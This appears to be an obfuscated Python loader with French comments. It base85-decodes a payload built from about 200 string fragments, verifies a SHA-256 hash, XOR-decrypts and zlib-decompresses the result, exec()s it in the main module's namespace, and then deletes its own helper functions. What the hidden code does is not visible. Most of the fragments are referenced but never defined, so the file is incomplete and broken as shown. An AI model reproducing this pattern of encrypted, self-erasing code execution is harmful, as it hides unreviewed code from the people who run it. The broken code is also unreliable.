_ckzWbROv_IFUCV = '+oDwO|_<YwaNA+w%|Ew@4VicBi)%c{bOZSj*p;bQKGk*lV#JJ!;=)d<7'
_c_V7Tmqq9QUv9e = '4OnTZ}Jd`7e^Z)hL;4Q^k65H2?1+DD%|@Kf27prZ7J+zS0Deqs*heuyH'
_ckRAxp9UwXKNNM = '#7M6-~NNK`Xboi521?p{1VUG$?P%M0^W=x273JVaf7*{fH4tCO;Bzj#t'
_cwc6RISSLyg8H5 = 'it1OPkz*Z7&TZG%AXqTapJJZMmQ_O7'

_pejK7GmWI2Enpe = __import__('base64').b85decode(_cqa8eMqLl2FI2H + _clEp38_8iCZmAU + _cnCc602_d_8dLH + _cngQRWaSHpDTrU + _co2AgxKATUnoU7 + _cufQliSMVtsgoP + _cwX2RTHFDucpYP + _ck5jz4U5uOsO_i + _cfoe267Ay6a2to + _cdaYYjAA9KW4Cr + _cm_7f16cx2e4t1 + _cfzZR5XPqkCQVl + _cvcBqDvORrpxkt + _cfvQQgFHzUjoCZ + _cq06O8qsqRJNmI + _ciQY8aQATda5dG + _cqNDAirJIxhYmv + _ch66durLJ5ObDT + _cfKfAuo2jiDNMo + _cdBrNTTwn4VgU4 + _cuBy8eaF0ByJDe + _cgD7XyzaMBkbCv + _cf8cxlPDAG7p9T + _cue_NTyVw12ibA + _cgiG7oLiZZRYT8 + _clsGB8dtoScG69 + _ctB2I5L1Qy1W3W + _cga5ofmy7muDQK + _cj09pqwhPYonD5 + _cptfwFmxZJzH5O + _chxbd93TAZZyMR + _ca6s_qaVfze8zt + _coKHcGSgPn4nR9 + _cm1gqDxWxfhNB2 + _co0TwJC72sUC6Q + _ceiEvjGDjz8OHk + _cldOxGkWuLeVLK + _ctskMtOfKkg9Jg + _ccK1KRXvHxhUE7 + _cf97wtiNHEly6V + _cbYTqn8gEchq3l + _cdAZ3Pjj5Jzv5z + _coQTHdk4e23P6k + _cwfUgVln3Hz63L + _cofT9EUfMkMXYC + _cy753r2G2yUwYZ + _cgTC2C7ME4Z7Lq + _chVS_YAOuQ4zRm + _crdFQqRCQlJs59 + _cpAyvukvnBe_0T + _crBKOC2dGjgeoz + _clCPbOdZnhLeKq + _cvXqBFXO729qlI + _ckK2BSqTaAewBI + _ckgwnQc9_VI1Sm + _czhS1AiULgveXO + _csIPUjvE3JQcsn + _cs6CE_BLglu_S_ + _cjgpUZs_4KeM8U + _chPvEutvj84UZJ + _c_FgAIaWToFiI4 + _cxIkQQGGTC7IQB + _crppPMyWtJ1RWc + _cdp9ExuVaoFiwU + _cqsvjkGVcp1OvA + _crh7y_b5m_EACF + _cpN1xC2NcdLghf + _cu4wSdLqf1yN5H + _ccxeMYJkHDW2rs + _clcK7m5hJ8gDVM + _czNj1gjtrz7FbZ + _ci7UnD9tZmd_e6 + _cbNJhokp5yMmHz + _czKiFhTis16UE4 + _c_RwXByClmvHQx + _czqf5D8i7hR8hx + _cc33pD9E_wPvIH + _cqYvTQST7F61w1 + _chEygi9HRIIdf8 + _cfNIdwn1wYyz3r + _csXyDDNYUyVa1n + _ciepXMzyJ7EVpV + _cw36KBCwt9rnSo + _cs0MkmQg8hN0I6 + _caF3L_grZlHQIp + _cytfQjMBG2JPNw + _czdnGCiiZFDf71 + _cb3B9weYLrBb71 + _cauf6rHYvbMbeb + _czTLBieCNIBtr_ + _ctd0drOlJRvZHz + _cn1pz3aaqzg9Zy + _cnw6u6q2ToHjRz + _ctQs4OU2UpJ9H5 + _cmiVVhGmtkgHxB + _cyKH4xY6Z7mozR + _caH1Nu9RjF7ylj + _cnZ3F_0wsCOBnc + _coRlmVo2G2Ry5e + _cevEiYzk3YJ7Vw + _cusWvlayVA3g13 + _cusQnYQWyhlvXO + _cvKhpTD3LCuuxO + _c_sAaJmQepibSL + _coDWChHDZnFpzN + _cgxPXqwJehP2AU + _cg30CXMSVzPUOf + _cwgX5cdHQix4hc + _ctobPNYjQbMCPL + _cmqRL2tnjvq1ny + _cyIfFK0MyI9YR6 + _cjfSaMSQPWcDFa + _cx2pU1eziOoCkB + _cdA4_BM0WMljJt + _cqwvf1pjf7nwr_ + _caXNn5Ngpfn9Sl + _cuSFiqsV391X6r + _cqj7deKye_Is4q + _cw5k0BIB6JW6Db + _clJBPMNlyn4vwB + _cfTk5gCG1bmU72 + _cnpzAhlk2Mxa0b + _cbtmmkgl3oyPtM + _crnsEiuokwYQUd + _cuMvVV_PBPZaAU + _cukx1SLXP6r9vS + _chE4QfGMQKyukY + _ccKNFXiy9MMY5L + _cyk1NIXwn8G8Rk + _crvc74fSRJY57F + _crTORSqwoqPe5B + _coAV2fOhZg7mhD + _caJjj0zhJvu2Wb + _clSupvVH2qQBgP + _clPPndntwkv5Kh + _cr1lavZ8ETdiBX + _cm7_5pUV14_Mxs + _cchK5K768fWjJq + _cf2W7VmqAlCVCP + _cmaHTbBy1r2qyL + _clFH0qzko2Os2Q + _cqwpt1LHZOPaWz + _chBrkPHDwK9bGX + _cjBG0pWhhkQ7AW + _ckDvI51RcmPWwU + _cdWHrQFkb9vIkw + _cyN33Udl7NudAs + _cvSiHvWcs3lBU9 + _ckqaW30_yp_SSN + _c_qKXr8L8Vt5Rj + _cbX3l9Keg3Pt97 + _c_2_6KxoI1wLTj + _cxgQ4ndepzEw4P + _cb100ESmIlMjem + _c_C9WxUczq3m8s + _chvtqh6I6cZZi8 + _cmEqkTAtvB5Jcm + _crUo02BS41TWlh + _cbhp1LpjGnIEzp + _cmGk4njCUivs0g + _cmdW3hYlbcyB14 + _ckKIjJ3lWW0nsU + _cbwqqO41ChgkFo + _coNi9moTnuP3fB + _cr3aSheyS2ZLYq + _c_ROEYZzZarxtt + _cw5WNR9W3Mr9Ik + _cvJ4R75ZDnJIt0 + _cd9lubQAYsoLNo + _ctVc39pFTw7mzi + _crdJdJKsJ5R6G4 + _ceK6c83Z4qC3Nk + _ck_c85PYJJLF6H + _cl1zeFWXBlPwfO + _coMiU7_AGKYIoE + _cwTDcutehMGmbm + _c_q1sJ0KhINQ5P + _cgxk95cRFd9OhP + _ctXYQeMLH8aiTx + _ccHBu1Bt9mKk10 + _c_eCv6s4ThtuZa + _caHzkWR3k2Lpj8 + _ck39zB6J0RFYIq + _cauVv0g0fhCecS + _cxgQmunTHGwEmU + _ccljR2aujQES_2 + _chxPKD4EBqfFhC + _cm8axlAXEQRoW0 + _cwg3eiN0o71jSe + _cx5RI5wCC355Z5 + _chlIZ5YeeCf5m9 + _cqAFYSKEASpwAU + _ckzWbROv_IFUCV + _c_V7Tmqq9QUv9e + _ckRAxp9UwXKNNM + _cwc6RISSLyg8H5)
if __import__('hashlib').sha256(_pejK7GmWI2Enpe).hexdigest() != '6ea9b2f9617365535a96e71c99263b2a6afdf5467ce4da77c4a8871a4078597d':
    __import__('sys').exit(1)
_xsmgku2gm0p2qJ = bytes([229, 14, 168, 98, 129, 97, 201, 250, 121, 147, 37, 177, 208])
_fkr7zrsqvKsVL8Q = bytes([139, 7, 135, 240, 244, 44, 213, 47, 92, 201, 242, 169, 164])

def _fxn4MfKL2ncFPdE(_bstctxDSv8gj8Y, _kmIZKLK46T5FkD):
    return bytes(_bstctxDSv8gj8Y[_iqKbmNiO2JK1DL] ^ _kmIZKLK46T5FkD[_iqKbmNiO2JK1DL % len(_kmIZKLK46T5FkD)] for _iqKbmNiO2JK1DL in range(len(_bstctxDSv8gj8Y)))

def _fdeHuBtMlSQn_Y2(_txCnwEhhDyZ9kf):
    import zlib
    return zlib.decompress(_txCnwEhhDyZ9kf) # Un seul niveau de zlib ici pour simplifier

def _fevtd1SaBiTiiVX():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xlMfGgqujkij4Z = _fxn4MfKL2ncFPdE(_pejK7GmWI2Enpe, _xsmgku2gm0p2qJ)
    # 2. Décompression Zlib
    _dlx62HNJuLQSq5 = _fdeHuBtMlSQn_Y2(_xlMfGgqujkij4Z)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dlx62HNJuLQSq5.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nmrUf3T2iO0CPW = _main.__dict__
    _nmrUf3T2iO0CPW.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nmrUf3T2iO0CPW)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevtd1SaBiTiiVX()
try:
    del _fxn4MfKL2ncFPdE, _fdeHuBtMlSQn_Y2, _fevtd1SaBiTiiVX
    del _pejK7GmWI2Enpe, _xsmgku2gm0p2qJ, _fkr7zrsqvKsVL8Q
except:
    pass
